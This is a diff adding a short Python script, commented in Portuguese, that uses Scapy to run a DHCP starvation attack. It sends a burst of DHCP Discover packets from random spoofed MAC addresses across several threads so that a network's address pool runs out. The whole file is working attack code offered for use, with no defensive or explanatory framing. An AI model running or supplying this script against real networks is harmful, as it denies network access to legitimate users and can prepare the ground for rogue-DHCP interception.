@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+
+import sys
+import random
+import threading
+from scapy.all import *
+
+# Desativar verificação de IPs no Scapy para spoofing DHCP
+conf.checkIPAddr = False
+
+# Definir interface (permite passar como argumento)
+iface = "\\Device\\NPF_{01033333-9A12-46EB-AB0D-4061CB052CD4}"
+print(f"[+] Enviando pacotes pela interface {iface}")
+
+# Função para gerar um MAC aleatório realista
+def random_mac():
+    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
+
+# Criar pacote DHCP Discover
+def create_dhcp_discover():
+    mac = random_mac()
+    print(f"[+] Usando MAC aleatório: {mac}")
+    
+    return Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
+           IP(src="0.0.0.0", dst="255.255.255.255") / \
+           UDP(sport=68, dport=67) / \
+           BOOTP(op=1, chaddr=mac2str(mac)) / \
+           DHCP(options=[("message-type", "discover"), "end"])
+
+# Função para enviar pacotes em um loop
+def send_dhcp(num_packets):
+    for i in range(num_packets):
+        dhcp_discover = create_dhcp_discover()
+        sendp(dhcp_discover, iface=iface, verbose=0)
+        print(f"[+] Pacote {i+1}/{num_packets} enviado")
+
+# Configurar número de pacotes e threads
+num_packets = 100  # Quantidade total de pacotes a enviar
+num_threads = 5    # Número de threads
+
+# Criar threads para envio simultâneo
+threads = []
+for _ in range(num_threads):
+    t = threading.Thread(target=send_dhcp, args=(num_packets // num_threads,))
+    t.start()
+    threads.append(t)
+
+# Aguardar todas as threads finalizarem
+try:
+    for t in threads:
+        t.join()
+except KeyboardInterrupt:
+    print("\n[+] DHCP Starvation interrompido pelo usuário.")
